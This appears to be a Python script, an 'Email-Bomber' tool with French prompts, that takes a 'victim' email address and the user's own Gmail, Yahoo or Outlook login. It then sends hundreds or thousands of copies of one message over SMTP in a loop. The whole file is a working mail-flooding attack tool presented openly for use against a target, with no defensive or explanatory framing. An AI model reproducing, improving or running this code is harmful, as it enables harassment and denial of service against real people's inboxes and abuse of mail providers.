#// Don't forget to hit SUBSCRIBE, COMMENT, LIKE, SHARE! and LEARN... :)
# But srsly, hit that sub button so you don't miss out on more content! 


'''imports'''
import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
    print(bcolors.GREEN + '''
                     \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              Author: w3w3w3
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                 ,-.--.

 (B̵̡̨̙͍̬͕͔̦̥͉̠̩̹̂̒͗̇̕ǫ̴̢̛̯̫̖̤̪̫̲̦̟̭͗͆͌̀̌̊̓̒̑͆͂̎͑͜͝ͅͅm̷̡̘̫͎̭̼̲͖̻͇̠̞̠̦̄̄̓́͂͆̓̀̿͝b̷̨̨̛̞̗͍̯̹̤͚̝͓̬̦̻̀͑̈́̓͊̓̓̀̓͘é̶̡͚̮̝̣̜͈͙̱̣̭̳͂͌̄ŗ̷̧̛͉̲̭̲͉̘͍̹͖̗͋̀̈̿͆̒̈́̎̂͠ͅ ̸̧̧͉̥͖͍͙̺͍͕͖̝̿̈͜m̶̮̰͔̂̈́͝a̷̠͖̩͓̫̗͙͈̪̰̞̎͐̎̑̑͠͠i̵͉͓͈̬̝̤̜͌̑̽̓̌̃͛͌̋̃̈́̕͘̚͠l̴̡̘͓͐̓̓̽͝ ̸͕̳̐̉B̸̢̛̖̺̖̘̹͉̞̲̭̰͕̥̜̄͒̍̈͋͛̇͒̊́͠͝ͅy̴̧̮̻̺̯͙̌̈̏̉̌͋͊̄̓ ̴̠͉̘̗̈́̌̆͗̏̆͂̓̂̈́̑̎͠Ḩ̴̨͈̟̰̖̥̫̯͑̑̐̅̌͌̇͌̓̈́̈́̽̀́ͅa̴̧̱͑̓̊̾̉͗̕x̸̧͖̱̠̻̻̬͔͔͇͓̼̻̪͒͒͊͒͝ơ̶̛̝͍̞͚̩̻̳̠̫̄̐̔̆̏͝ͅŕ̶̖̭̳̗̗͖̫̗̩̬͍͚̉͆̃̾̔̂͋͊̒͑̑̚ ̴̢̡̼̯̙̳̱͛͂̍̐̂̀̅̂͒̔D̶̯̝̪̫͎̤̺͍̤̞̣̄͗̾̾̐̿̽͌̆̄̈́̚̕͜͝͝ę̵̢̳̱̝̘̖͚̝͉̣̆̈́̽̀̍͌̆̆̊̕͠R̷̤̦̘̠͖̱̬͙̦͆ö̵̢̢̧̩̣̜̪̞͇̟̣̝͚̫́̕ų̴̹̠̭͈͕̦̋ţ̶̖͎̜̬̣̼̦̉̆̍̀̂̓͘͘͠ͅi̴̢̢̫̝̪͈͖͍̳̝̝̘̞͙̅̄͆̽͜͠͝ñ̴̡̨̟̮͈̝̥̪͎̲̰͋͘e̵̢̡̹̼̱͚̝̮͐͗͋́͂̅̕ͅ)
                                                                    `--' ''')
                                                                    
                                                                    
class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n\~~~1ère étape du script~~~/')
            self.target = str(input(bcolors.GREEN + 'Adresse Mail Victime <: '))
            self.mode = int(input(bcolors.GREEN + 'Choisis ton option (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Option invalid. Aurevoir.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n\~~~2ème étape du script~~~/')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Combien de Spam vont être envoyés  <: '))
            print(bcolors.RED + f'\n+[+[+[ Tu as sélectionné l option: {self.mode} et {self.amount} emails seront envoyés ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n\~~~Dernière étape du script~~~/')
            self.server = str(input(bcolors.GREEN + 'Entre : 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Entre ton adresse mail <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Entre ton MDP <: '))
            self.subject = str(input(bcolors.GREEN + 'Entre le sujet du mail <: '))
            self.message = str(input(bcolors.GREEN + 'Entre le message que va contenir le mail <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'email envoyé: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n \~~~Attaque en cours...~~~/')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n \~~~Attaque finie~~~/')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
    
